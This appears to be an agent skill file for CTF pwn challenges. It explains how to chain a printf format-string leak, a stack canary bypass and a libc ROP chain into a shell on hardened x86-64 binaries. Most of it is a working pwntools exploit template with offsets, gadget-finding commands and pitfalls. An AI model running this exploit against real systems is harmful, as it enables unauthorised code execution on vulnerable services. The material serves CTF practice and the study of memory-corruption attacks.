---
name: fmtstr-bof-canary-libc-rop
description: "PWN: Format string leak + buffer overflow with canary bypass and libc ROP chain to system('/bin/sh')."
version: 1.0.0
author: kubesame
license: MIT
platforms: [linux]
metadata:
  hermes:
    tags: [ctf, pwn, format-string, buffer-overflow, stack-canary, rop, libc, glibc-2.35, pwntools]
---

# Format String → Canary Bypass → Libc ROP Shell

Use when a PIE+Full RELRO+NX+Canary binary has:
1. A `printf(user_input)` format string vulnerability (direct arg, not via `%s`)
2. A conditional stack buffer overflow (e.g., gated behind a guessable value)
3. A provided or identifiable libc

## Trigger Conditions

- `checksec` shows: Full RELRO, Canary, NX, PIE
- Source or disassembly reveals `printf(buf)` where `buf` is user-controlled
- A second input path has `fgets(buf, SIZE, stdin)` where SIZE > buffer allocation
- The overflow path is gated behind a value leaked by the format string

## Pattern Recognition

### Stack Layout Analysis
```
rbp-0xNN  gate_value     (e.g., rand(), password, token)
rbp-0xMM  input_buffer   (overflow target)
rbp-0x08  stack_canary   (8 bytes, last byte always 0x00)
rbp+0x00  saved_rbp
rbp+0x08  return_address  ← ROP target
```

### Format String Position Mapping
In x86-64, printf args go: rdi(fmt), rsi, rdx, rcx, r8, r9, then stack.
Positional args `%N$p` reference the Nth argument (1-indexed from rsi).

To find your buffer on the stack:
```bash
printf '%%p.%%p.%%p.%%p.%%p.%%p.%%p.%%p.%%p.%%p\n' | ./binary
```
Look for `0x4141414141414141` (if you send `AAAAAAAA`) to identify the buffer's position.

Then calculate offsets:
- **Buffer start position**: Where you see your AAAA marker
- **Canary position**: `buffer_pos + (buffer_offset - 0x08) / 8`
- **Gate value position**: Usually right before buffer in stack layout
- **Libc return**: Typically `__libc_start_call_main+0x80` a few positions after canary

## Leak Strategy

Send a format string like: `%7$p.%17$p.%19$p`
- Position for gate value (rand, etc.) — may share a qword with adjacent variable
- Position for stack canary — verify it ends in `\x00`
- Position for libc return address — verify page-aligned base after subtraction

### Common Libc Return Offsets
| Glibc Version | Symbol | Offset |
|---|---|---|
| 2.35 | `__libc_start_call_main+0x80` | `0x29d90` |
| 2.31 | `__libc_start_main+0xf3` | varies |
| 2.27 | `__libc_start_main+0xe7` | varies |

Find it yourself:
```bash
objdump -d libc.so.6 | grep -A5 '__libc_start_call_main>:' | grep 'call.*rax'
# Return address = instruction AFTER the `call *%rax`
```

## Exploit Template

```python
from pwn import *

BINARY = "./challenge_patched"
LIBC   = "./libc.so.6"

# Find these with: readelf -Ws libc.so.6, strings -tx, ROPgadget, one_gadget
OFF_LIBC_RET  = 0x29d90   # __libc_start_call_main+0x80
OFF_SYSTEM    = 0x50d60
OFF_BINSH     = 0x1d8698
OFF_POP_RDI   = 0x2a3e5   # ROPgadget --binary libc.so.6 | grep 'pop rdi'
OFF_RET       = 0x29cd6   # stack alignment gadget

def exploit(target=None):
    libc = ELF(LIBC, checksec=False)
    io = remote(*target.split(':')) if target else process(BINARY)

    # Stage 1: Leak canary, gate value, libc
    io.recvuntil(b"prompt: ")  # adjust to binary
    io.sendline(b"%7$p.%17$p.%19$p")  # adjust positions
    io.recvuntil(b"prefix ")  # adjust to binary
    leaks = io.recvline().decode().strip().split(".")

    gate_val = (int(leaks[0], 16) >> 32) & 0xFFFFFFFF  # extract from shared qword
    canary   = int(leaks[1], 16)
    libc_base = int(leaks[2], 16) - OFF_LIBC_RET
    assert libc_base & 0xfff == 0, "Bad libc base"

    # Stage 2: Pass gate check
    gate_signed = gate_val - 0x100000000 if gate_val >= 0x80000000 else gate_val
    io.sendline(str(gate_signed).encode())

    # Stage 3: Overflow with ROP
    PADDING = 72  # distance from buffer to canary (adjust per binary)
    payload  = b"A" * PADDING
    payload += p64(canary)
    payload += p64(0)                           # saved rbp
    payload += p64(libc_base + OFF_RET)          # stack alignment
    payload += p64(libc_base + OFF_POP_RDI)      # pop rdi; ret
    payload += p64(libc_base + OFF_BINSH)        # "/bin/sh"
    payload += p64(libc_base + OFF_SYSTEM)       # system()
    io.sendline(payload)
    io.interactive()
```

## Setup Commands

```bash
# Patch binary with correct loader
pwninit --bin ./challenge --libc ./libc.so.6
# Or manually:
patchelf --set-interpreter ./ld-2.35.so --set-rpath . ./challenge_patched

# Find gadgets
one_gadget ./libc.so.6
ROPgadget --binary ./libc.so.6 --only 'pop|ret' | grep 'pop rdi'
readelf -Ws ./libc.so.6 | grep -w system
strings -tx ./libc.so.6 | grep '/bin/sh'
```

## Pitfalls

- **Canary always ends in `\x00`** — if your leak doesn't, you have the wrong position
- **Stack alignment**: x86-64 requires 16-byte aligned RSP before `call`. Add a bare `ret` gadget before your ROP chain if `system()` segfaults
- **Signed vs unsigned for scanf `%d`**: If gate value ≥ 0x80000000, send it as negative (subtract 0x100000000)
- **Shared qword**: When two 4-byte vars are adjacent on stack, they share one `%p` leak — extract with shifts/masks
- **LD_PRELOAD won't work** across major glibc versions — always use `patchelf` or `pwninit` to set the correct interpreter
- **Full RELRO** = no GOT overwrite; must use ROP or one_gadget
